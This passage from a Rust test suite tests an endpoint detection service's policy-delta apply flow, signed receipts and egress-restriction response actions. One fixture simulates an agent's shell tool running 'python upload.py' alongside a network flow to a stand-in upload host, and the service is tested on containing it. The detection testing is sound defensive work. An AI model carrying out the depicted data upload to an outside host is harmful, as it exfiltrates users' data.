                        policy_synced: Some(true),
                        enforcement_ready: Some(true),
                        last_reload_observation: Some(
                            crate::macos::status::ProviderReloadObservation {
                                request_id: Some(request_id.clone()),
                                command: Some("reload_policy".to_string()),
                                policy_snapshot_path: Some(
                                    policy_delta_reload_path_for_ack.clone(),
                                ),
                                generation: Some(request.generation),
                                accepted: Some(true),
                                reloaded: Some(true),
                                error: None,
                            },
                        ),
                        ..ProviderStatus::unknown()
                    },
                    ..CombinedSystemExtensionStatus::default()
                })
                .await;
            request
                .reply_tx
                .send(Ok(crate::macos::host::MacosNetworkExtensionReloadResult {
                    requested: true,
                    saved: true,
                    request_id,
                    policy_snapshot_path: policy_delta_reload_path_for_ack,
                    generation: request.generation,
                }))
                .unwrap_or_else(|_| panic!("failed to send policy-delta reload response"));
        });

        let body = serde_json::json!({
            "dryRun": false,
            "appliedBy": "operator:bob",
            "actor": {
                "endpointId": "endpoint-policy-delta-1",
                "userId": "operator:bob",
                "sessionId": "session-policy-delta-apply-1",
                "agentId": "agent-api",
                "approvalId": "approval-policy-delta-1"
            },
            "note": "apply generated egress overlay",
            "providerAckTimeoutMs": 1000
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/policy-deltas/{policy_delta_id}/apply"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build policy delta apply: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("policy delta apply failed: {e}"));
        let status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 512 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read policy delta apply: {e}"));
        assert_eq!(
            status,
            StatusCode::OK,
            "policy delta apply response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let apply_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode policy delta apply: {e}"));
        assert_eq!(apply_payload["record"]["dryRun"], false);
        assert_eq!(apply_payload["record"]["applied"], true);
        assert_eq!(
            apply_payload["record"]["crossWindowImpactHash"],
            "0xcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
        );
        assert_eq!(
            apply_payload["record"]["crossWindowRecommendationHash"],
            "0xdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd"
        );
        assert_eq!(
            apply_payload["receipt"]["receipt"]["metadata"]["endpointDecision"]["receiptFamily"],
            "policy_delta"
        );
        assert_eq!(
            apply_payload["preparedReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "policy_delta"
        );
        let applied_endpoint_decision =
            &apply_payload["receipt"]["receipt"]["metadata"]["endpointDecision"];
        let prepared_endpoint_decision =
            &apply_payload["preparedReceipt"]["receipt"]["metadata"]["endpointDecision"];
        assert_eq!(
            apply_payload["record"]["actor"]["approvalId"],
            "approval-policy-delta-1"
        );
        assert_eq!(
            applied_endpoint_decision["actor"]["approvalId"],
            "approval-policy-delta-1"
        );
        assert_eq!(
            prepared_endpoint_decision["actor"]["approvalId"],
            "approval-policy-delta-1"
        );
        assert!(applied_endpoint_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing applied policy delta receipt evidence"))
            .iter()
            .any(|item| item["key"] == "actorHash"));
        assert!(prepared_endpoint_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing prepared policy delta receipt evidence"))
            .iter()
            .any(|item| item["key"] == "actorHash"));
        assert_eq!(
            apply_payload["preparedReceipt"]["receipt"]["metadata"]["endpointDecision"]["decision"]
                ["title"],
            "Endpoint staged policy delta prepared"
        );
        let apply_ledger_path =
            crate::edr::ledger::policy_delta::policy_delta_apply_index_path(&policy_delta_dir);
        let apply_ledger = std::fs::read_to_string(&apply_ledger_path)
            .unwrap_or_else(|e| panic!("failed to read policy delta apply ledger: {e}"));
        assert!(
            apply_ledger.contains(policy_delta_id),
            "policy delta apply ledger missing {policy_delta_id}: {apply_ledger}"
        );
        assert!(
            apply_payload["receipt"]["receipt"]["metadata"]["endpointDecision"]["evidence"]
                .as_array()
                .unwrap_or_else(|| panic!("missing apply policy delta receipt evidence"))
                .iter()
                .any(|item| item["key"] == "crossWindowImpactHash")
        );
        assert!(
            apply_payload["receipt"]["receipt"]["metadata"]["endpointDecision"]["evidence"]
                .as_array()
                .unwrap_or_else(|| panic!("missing apply policy delta receipt evidence"))
                .iter()
                .any(|item| item["key"] == "crossWindowRecommendationHash")
        );
        assert!(
            apply_payload["receipt"]["receipt"]["metadata"]["endpointDecision"]["evidence"]
                .as_array()
                .unwrap_or_else(|| panic!("missing apply policy delta receipt evidence"))
                .iter()
                .any(|item| item["key"] == "sourceAffectedIdentityContext")
        );
        assert!(
            apply_payload["receipt"]["receipt"]["metadata"]["endpointDecision"]["evidence"]
                .as_array()
                .unwrap_or_else(|| panic!("missing apply policy delta receipt evidence"))
                .iter()
                .any(|item| item["key"] == "sourceAffectedToolContext")
        );
        assert_eq!(
            apply_payload["receipt"]["receipt"]["metadata"]["endpointDecision"]["decision"]
                ["findingId"],
            policy_delta_id
        );
        assert_eq!(
            apply_payload["postApplyEnforcement"]["policySyncedToDisk"],
            true
        );
        assert_eq!(
            apply_payload["postApplyEnforcement"]["daemonPolicyReload"]["requested"],
            true
        );
        assert_eq!(
            apply_payload["postApplyEnforcement"]["daemonPolicyReload"]["reloaded"],
            true
        );
        assert_eq!(
            apply_payload["postApplyEnforcement"]["networkExtensionPolicyReload"]["requested"],
            true
        );
        assert_eq!(
            apply_payload["postApplyEnforcement"]["networkExtensionPolicyReload"]["saved"],
            true
        );
        assert_eq!(
            apply_payload["postApplyEnforcement"]["networkExtensionPolicyReload"]["requestId"],
            "policy-delta-reload-1"
        );
        assert_eq!(
            apply_payload["postApplyEnforcement"]["networkExtensionPolicyReload"]
                ["policySnapshotPath"],
            policy_delta_reload_path
        );
        assert_eq!(
            apply_payload["postApplyEnforcement"]["networkExtensionPolicyReload"]
                ["providerReloadObserved"],
            true
        );
        assert_eq!(
            apply_payload["postApplyEnforcement"]["networkExtensionPolicyReload"]
                ["providerReloadMatched"],
            true
        );
        let network_extension_policy =
            read_json_file(state.edr_network_extension_egress_policy_path.as_ref());
        assert!(network_extension_policy["restrictions"]
            .as_array()
            .unwrap_or_else(|| panic!("missing policy-delta NetworkExtension restrictions"))
            .iter()
            .any(
                |restriction| restriction["target"] == "delta.example.invalid:443"
                    && restriction["active"] == true
                    && restriction["executionId"]
                        .as_str()
                        .unwrap_or_default()
                        .starts_with("policy_egress-")
            ));
        assert_eq!(
            apply_payload["postApplyEnforcement"]["providerStatusRefresh"]["requested"],
            true
        );
        assert_eq!(
            apply_payload["postApplyEnforcement"]["providerStatusRefresh"]["refreshed"],
            false
        );
        let provider_acks = apply_payload["postApplyEnforcement"]["providerPolicyAcknowledgements"]
            .as_array()
            .unwrap_or_else(|| panic!("missing provider policy acknowledgements"));
        assert_eq!(
            apply_payload["postApplyEnforcement"]["providerAcknowledgementPoll"]["requested"],
            true
        );
        assert_eq!(
            apply_payload["postApplyEnforcement"]["providerAcknowledgementPoll"]["satisfied"],
            true
        );
        assert!(
            apply_payload["postApplyEnforcement"]["providerAcknowledgementPoll"]["attempts"]
                .as_u64()
                .unwrap_or(0)
                >= 1
        );
        assert!(provider_acks.iter().any(|ack| {
            ack["providerId"] == "macos.network_extension"
                && ack["acknowledged"] == true
                && ack["observedPolicyEpoch"] == apply_payload["record"]["newPolicyEpoch"]
        }));
        assert!(provider_acks.iter().any(|ack| {
            ack["providerId"] == "macos.endpoint_security"
                && ack["acknowledged"] == true
                && ack["observedPolicyEpoch"] == apply_payload["record"]["newPolicyEpoch"]
        }));
        assert_eq!(
            apply_payload["postApplyEnforcement"]["daemonRestartRequested"],
            false
        );
        assert_eq!(
            apply_payload["postApplyEnforcement"]["daemonRestarted"],
            false
        );
        assert_eq!(
            apply_payload["postApplyEnforcement"]["localPolicy"]["policyEpoch"],
            apply_payload["record"]["newPolicyEpoch"]
        );
        assert_eq!(
            apply_payload["postApplyEnforcement"]["crossWindowImpactHash"],
            "0xcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"
        );
        assert_eq!(
            apply_payload["postApplyEnforcement"]["crossWindowRecommendationHash"],
            "0xdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd"
        );
        assert_eq!(
            apply_payload["postApplyEnforcement"]["receipt"]["receipt"]["metadata"]
                ["endpointDecision"]["receiptFamily"],
            "sensor_state"
        );
        let enforcement_receipt_endpoint_decision = &apply_payload["postApplyEnforcement"]
            ["receipt"]["receipt"]["metadata"]["endpointDecision"];
        let enforcement_receipt_evidence = enforcement_receipt_endpoint_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing post-apply enforcement receipt evidence"));
        let true_hash = sha256(b"true").to_hex_prefixed();
        let false_hash = sha256(b"false").to_hex_prefixed();
        let expected_epoch_hash =
            sha256(expected_new_epoch.to_string().as_bytes()).to_hex_prefixed();
        let policy_delta_reload_path_hash =
            sha256(policy_delta_reload_path.as_bytes()).to_hex_prefixed();
        assert!(enforcement_receipt_evidence.iter().any(|item| {
            item["key"] == "policyDeltaApplyProviderAckPollSatisfied"
                && item["valueHash"].as_str() == Some(true_hash.as_str())
        }));
        assert!(enforcement_receipt_evidence.iter().any(|item| {
            item["key"] == "policyDeltaApplyProviderRefreshRequested"
                && item["valueHash"].as_str() == Some(true_hash.as_str())
        }));
        assert!(enforcement_receipt_evidence.iter().any(|item| {
            item["key"] == "policyDeltaApplyProviderRefreshRefreshed"
                && item["valueHash"].as_str() == Some(false_hash.as_str())
        }));
        assert!(enforcement_receipt_evidence.iter().any(|item| {
            item["key"] == "policyDeltaApplyNetworkExtensionReloadRequested"
                && item["valueHash"].as_str() == Some(true_hash.as_str())
        }));
        assert!(enforcement_receipt_evidence.iter().any(|item| {
            item["key"] == "policyDeltaApplyNetworkExtensionReloadSaved"
                && item["valueHash"].as_str() == Some(true_hash.as_str())
        }));
        assert!(enforcement_receipt_evidence.iter().any(|item| {
            item["key"] == "policyDeltaApplyNetworkExtensionReloadPolicySnapshotPath"
                && item["valueHash"].as_str() == Some(policy_delta_reload_path_hash.as_str())
        }));
        assert!(enforcement_receipt_evidence.iter().any(|item| {
            item["key"] == "policyDeltaApplyCrossWindowImpactHash"
                && item["valueHash"].as_str()
                    == Some(
                        sha256(
                            b"0xcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc",
                        )
                        .to_hex_prefixed()
                        .as_str(),
                    )
        }));
        assert!(enforcement_receipt_evidence.iter().any(|item| {
            item["key"] == "policyDeltaApplyCrossWindowRecommendationHash"
                && item["valueHash"].as_str()
                    == Some(
                        sha256(
                            b"0xdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd",
                        )
                        .to_hex_prefixed()
                        .as_str(),
                    )
        }));
        assert!(enforcement_receipt_evidence.iter().any(|item| {
            item["key"] == "providerAck.macos_network_extension.acknowledged"
                && item["valueHash"].as_str() == Some(true_hash.as_str())
        }));
        assert!(enforcement_receipt_evidence.iter().any(|item| {
            item["key"] == "providerAck.macos_network_extension.observedPolicyEpoch"
                && item["valueHash"].as_str() == Some(expected_epoch_hash.as_str())
        }));
        assert!(enforcement_receipt_evidence.iter().any(|item| {
            item["key"] == "providerAck.macos_network_extension.policySynced"
                && item["valueHash"].as_str() == Some(true_hash.as_str())
        }));
        assert!(enforcement_receipt_evidence.iter().any(|item| {
            item["key"] == "providerAck.macos_network_extension.enforcementReady"
                && item["valueHash"].as_str() == Some(true_hash.as_str())
        }));
        let backup_path = apply_payload["record"]["backupPath"]
            .as_str()
            .unwrap_or_else(|| panic!("missing policy delta backup path"));
        assert!(std::path::Path::new(backup_path).is_file());
        let applied_policy = {
            let settings = state.settings.read().await;
            std::fs::read_to_string(&settings.policy_path)
                .unwrap_or_else(|e| panic!("failed to read applied policy: {e}"))
        };
        assert!(applied_policy.contains("endpoint_decision_engine"));
        assert!(applied_policy.contains("delta.example.invalid:443"));
        let applied_snapshot = {
            let settings = state.settings.read().await;
            endpoint_policy_snapshot_from_policy_bytes(
                applied_policy.as_bytes(),
                &settings.policy_path,
            )
            .unwrap_or_else(|e| panic!("failed to snapshot applied policy: {e}"))
        };
        let previous_epoch = apply_payload["record"]["previousPolicyEpoch"]
            .as_u64()
            .unwrap_or_else(|| panic!("missing previous policy epoch"));
        let new_epoch = apply_payload["record"]["newPolicyEpoch"]
            .as_u64()
            .unwrap_or_else(|| panic!("missing new policy epoch"));
        assert_eq!(new_epoch, previous_epoch.saturating_add(1));
        assert_eq!(applied_snapshot.policy_epoch, new_epoch);

        let _ = std::fs::remove_file(staged_detection_path);
        let _ = std::fs::remove_dir_all(policy_delta_dir);
        let settings = state.settings.read().await;
        let _ = std::fs::remove_file(&settings.policy_path);
    }

    #[tokio::test]
    async fn agent_edr_response_action_dry_run_requires_graph_target_and_receipts() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[61u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state = test_state();
        state.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state);
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/evidence-bundles/{bundle_id}",
                get(agent_edr_evidence_bundle),
            )
            .route("/api/v1/agent/edr/receipts", get(agent_edr_receipts))
            .route(
                "/api/v1/agent/edr/response-executions",
                get(agent_edr_response_executions),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/cancel",
                post(agent_edr_response_execution_cancel),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/acknowledge",
                post(agent_edr_response_execution_acknowledge),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}",
                get(agent_edr_response_execution),
            )
            .with_state(Arc::clone(&state));
        let identity_metadata = BTreeMap::from([
            ("agentId".to_string(), serde_json::json!("agent-response-1")),
            (
                "workloadIdentity".to_string(),
                serde_json::json!("workload-response-1"),
            ),
            (
                "approvalId".to_string(),
                serde_json::json!("approval-response-1"),
            ),
        ]);
        let observations = vec![
            EndpointObservation {
                observation_id: "response-tool-1".to_string(),
                host_id: Some("host-response-1".to_string()),
                user_id: Some("alice".to_string()),
                session_id: Some("session-response-1".to_string()),
                process: EndpointProcess {
                    process_guid: Some("proc-response-1".to_string()),
                    image: Some("/usr/bin/python3".to_string()),
                    ..EndpointProcess::default()
                },
                event: EndpointEvent::ToolCall {
                    tool_name: "mcp.shell".to_string(),
                    parameters: serde_json::json!({
                        "command": "python upload.py"
                    }),
                },
                metadata: identity_metadata.clone(),
                ..EndpointObservation::default()
            },
            EndpointObservation {
                observation_id: "response-network-1".to_string(),
                host_id: Some("host-response-1".to_string()),
                user_id: Some("alice".to_string()),
                session_id: Some("session-response-1".to_string()),
                process: EndpointProcess {
                    process_guid: Some("proc-response-1".to_string()),
                    image: Some("/usr/bin/python3".to_string()),
                    ..EndpointProcess::default()
                },
                event: EndpointEvent::NetworkFlow {
                    host: "egress.example.invalid".to_string(),
                    port: 443,
                    protocol: Some("tcp".to_string()),
                    url: Some("https://egress.example.invalid/upload".to_string()),
                },
                metadata: identity_metadata,
                ..EndpointObservation::default()
            },
        ];
        let body = serde_json::json!({
            "observations": observations,
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build edr findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("edr findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let body = serde_json::json!({
            "action": "restrict_egress",
            "process": {
                "processGuid": "proc-response-1"
            },
            "ttlSeconds": 600,
            "reason": "contain process tree for 10 minutes",
            "dryRun": true
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build response action request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("response action request failed: {e}"));
        let status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read response action response: {e}"));
        assert_eq!(
            status,
            StatusCode::OK,
            "unexpected response action response body: {}",
            String::from_utf8_lossy(&bytes)
        );
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode response action response: {e}"));

        assert_eq!(payload["plan"]["dryRun"], true);
        assert_eq!(payload["plan"]["ttlSeconds"], 600);
        assert_eq!(payload["plan"]["action"], "restrict_egress");
        assert!(payload["graph"]["nodes"]
            .as_object()
            .unwrap_or_else(|| panic!("missing response graph nodes"))
            .values()
            .any(|node| node["label"] == "egress.example.invalid:443"));
        assert_eq!(payload["affectedIdentityCount"].as_u64(), Some(6));
        assert_eq!(payload["affectedToolCount"].as_u64(), Some(1));
        assert_eq!(
            payload["affectedIdentities"]["hosts"][0]["id"],
            "host-response-1"
        );
        assert_eq!(payload["affectedIdentities"]["users"][0]["id"], "alice");
        assert_eq!(
            payload["affectedIdentities"]["sessions"][0]["id"],
            "session-response-1"
        );
        assert_eq!(
            payload["affectedIdentities"]["agents"][0]["id"],
            "agent-response-1"
        );
        assert_eq!(
            payload["affectedIdentities"]["workloads"][0]["id"],
            "workload-response-1"
        );
        assert_eq!(
            payload["affectedIdentities"]["approvals"][0]["id"],
            "approval-response-1"
        );
        assert_eq!(payload["affectedTools"][0]["toolName"], "mcp.shell");

        let signed: SignedReceipt = serde_json::from_value(payload["receipt"].clone())
            .unwrap_or_else(|e| panic!("failed to decode response receipt: {e}"));
        let endpoint_decision = signed
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing endpointDecision response metadata"));
        let public_key = endpoint_decision
            .get("signer")
            .and_then(|signer| signer.get("signerPublicKey"))
            .and_then(serde_json::Value::as_str)
            .unwrap_or_else(|| panic!("missing response receipt signer public key"));
        let public_key = hush_core::PublicKey::from_hex(public_key)
            .unwrap_or_else(|e| panic!("failed to parse response receipt public key: {e}"));
        let verification = signed.verify(&hush_core::receipt::PublicKeySet::new(public_key));
        assert!(verification.valid);
        assert_eq!(endpoint_decision["receiptFamily"], "response_request");
        assert_eq!(
            endpoint_decision["decision"]["rollbackRef"],
            payload["plan"]["rollbackRef"]
        );
        assert_eq!(endpoint_decision["actor"]["agentId"], "agent-api");
        assert_eq!(
            endpoint_decision["actor"]["workloadId"],
            "endpoint-response-engine"
        );
        assert_eq!(endpoint_decision["actor"]["posture"], "unknown");

        let failing_observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-response-failure-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::FileAccess {
                operation: FileOperation::Write,
                path: "/tmp/clawdstrike-response-failure.txt".to_string(),
                source_url: None,
                content_preview: None,
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [failing_observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build failing findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("failing findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let body = serde_json::json!({
            "action": "restrict_egress",
            "process": {
                "processGuid": "proc-response-failure-1"
            },
            "ttlSeconds": 600,
            "reason": "attempt egress response on graph without network targets",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build failed response action request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("failed response action request failed: {e}"));
        assert_eq!(response.status(), StatusCode::BAD_REQUEST);
        let bytes = axum::body::to_bytes(response.into_body(), 16 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read failed response action error: {e}"));
        let error = String::from_utf8(bytes.to_vec())
            .unwrap_or_else(|e| panic!("failed response action error is not utf8: {e}"));
        assert!(error.contains("invalid egress restriction target"));
        assert!(error.contains("failed response execution recorded as"));

        let req = axum::http::Request::builder()
            .method("GET")
            .uri("/api/v1/agent/edr/response-executions?limit=10")
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build failed execution list request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("failed execution list request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read failed execution list: {e}"));
        let executions_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode failed execution list: {e}"));
        assert_eq!(executions_payload["execution_count"], 1);
        assert_eq!(
            executions_payload["executions"][0]["execution"]["status"],
            "failed"
        );
        assert_eq!(
            executions_payload["executions"][0]["execution"]["actor"]["userId"],
            "operator:test"
        );

        let req = axum::http::Request::builder()
            .method("GET")
            .uri("/api/v1/agent/edr/receipts?family=response_execution&limit=10")
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build failed receipt request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("failed receipt request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read failed receipt response: {e}"));
        let receipts_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode failed receipt response: {e}"));
        assert_eq!(receipts_payload["receipt_count"], 1);
        let failed_decision =
            &receipts_payload["receipts"][0]["receipt"]["metadata"]["endpointDecision"];
        assert_eq!(failed_decision["receiptFamily"], "response_execution");
        assert_eq!(
            failed_decision["decision"]["action"],
            serde_json::Value::String("restrict_egress".to_string())
        );
        assert_eq!(
            failed_decision["decision"]["title"],
            "Endpoint response action failed"
        );
        assert_eq!(
            failed_decision["decision"]["passed"],
            serde_json::Value::Bool(false)
        );
        let failed_hash = sha256(b"failed").to_hex_prefixed();
        assert!(failed_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing failed receipt evidence"))
            .iter()
            .any(|item| item["key"] == "executionStatus"
                && item["valueHash"].as_str() == Some(failed_hash.as_str())));
        let failed_execution_id = executions_payload["executions"][0]["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing failed execution id"));

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/receipts?family=response_execution&status=failed&executionId={failed_execution_id}&actorUserId=operator:test&limit=10"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build failed receipt search request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("failed receipt search request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read failed receipt search response: {e}"));
        let filtered_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode failed receipt search response: {e}"));
        assert_eq!(filtered_payload["receipt_count"], 1);
        let receipt_index_path = endpoint_receipt_index_path(&receipt_path);
        assert!(receipt_index_path.is_file());
        let receipt_index = read_endpoint_receipt_index(&receipt_index_path)
            .unwrap_or_else(|e| panic!("failed to read receipt index: {e}"));
        assert!(receipt_index.iter().any(|record| {
            record.family.as_deref() == Some("response_execution")
                && record.action.as_deref() == Some("restrict_egress")
                && record.execution_id.as_deref() == Some(failed_execution_id)
                && record.execution_status.as_deref() == Some("failed")
                && record.actor_user_id.as_deref() == Some("operator:test")
                && record.byte_len > 0
        }));
        std::fs::remove_file(&receipt_index_path)
            .unwrap_or_else(|e| panic!("failed to remove receipt index: {e}"));
        assert!(!receipt_index_path.exists());

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/receipts?family=response_execution&status=failed&executionId={failed_execution_id}&actorUserId=operator:test&limit=10"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build rebuilt receipt search request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("rebuilt receipt search request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read rebuilt receipt search response: {e}"));
        let rebuilt_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode rebuilt receipt search response: {e}"));
        assert_eq!(rebuilt_payload["receipt_count"], 1);
        assert!(receipt_index_path.is_file());
        std::fs::write(&receipt_index_path, b"")
            .unwrap_or_else(|e| panic!("failed to write empty receipt index: {e}"));

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/receipts?family=response_execution&status=failed&executionId={failed_execution_id}&actorUserId=operator:test&limit=10"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build empty-index receipt search request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("empty-index receipt search request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read empty-index receipt search response: {e}"));
        let empty_index_payload: serde_json::Value =
            serde_json::from_slice(&bytes).unwrap_or_else(|e| {
                panic!("failed to decode empty-index receipt search response: {e}")
            });
        assert_eq!(empty_index_payload["receipt_count"], 1);

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(
                "/api/v1/agent/edr/receipts?family=response_execution&status=succeeded&actorUserId=operator:test&limit=10",
            )
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build mismatched receipt search request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("mismatched receipt search request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read mismatched receipt search response: {e}"));
        let filtered_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode mismatched receipt search response: {e}"));
        assert_eq!(filtered_payload["receipt_count"], 0);

        let body = serde_json::json!({
            "action": "restrict_egress",
            "process": {
                "processGuid": "proc-response-1"
            },
            "ttlSeconds": 600,
            "reason": "attempt live response without actor identity",
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build actorless response action request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("actorless response action request failed: {e}"));
        assert_eq!(response.status(), StatusCode::BAD_REQUEST);
        let bytes = axum::body::to_bytes(response.into_body(), 16 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read actorless response action error: {e}"));
        let error = String::from_utf8(bytes.to_vec())
            .unwrap_or_else(|e| panic!("actorless response action error is not utf8: {e}"));
        assert!(error.contains("live response execution requires actor identity"));
        let _ = std::fs::remove_file(receipt_path);
    }

    #[tokio::test]
    async fn agent_edr_response_action_rejects_out_of_range_ttl() {
        let app = Router::new()
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .with_state(Arc::new(test_state()));

        for ttl_seconds in [0, EDR_MAX_RESPONSE_TTL_SECONDS + 1] {
            let body = serde_json::json!({
                "action": "collect_evidence",
                "rootNodeId": "process:ttl-validation",
                "ttlSeconds": ttl_seconds
            });
            let req = axum::http::Request::builder()
                .method("POST")
                .uri("/api/v1/agent/edr/response-action")
                .header(AUTHORIZATION, "Bearer test-token")
                .header(CONTENT_TYPE, "application/json")
